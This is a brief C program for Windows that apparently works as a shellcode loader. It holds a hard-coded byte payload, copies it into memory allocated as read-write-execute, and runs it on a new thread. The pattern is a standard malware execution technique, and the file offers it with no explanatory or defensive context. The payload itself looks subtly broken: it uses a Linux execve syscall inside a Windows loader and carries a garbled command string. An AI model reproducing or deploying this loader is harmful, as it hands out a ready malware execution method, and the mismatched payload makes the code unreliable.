#include <windows.h>

int main()
{
  const char shellcode[] = "\x48\x31\xc0\x50\x48\xbb\x2e\x65\x78\x65\x64\x6d\x63\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05";
  PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
  DWORD threadID;
  HANDLE Thread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
  WaitForSingleObject(Thread, INFINITE);
}
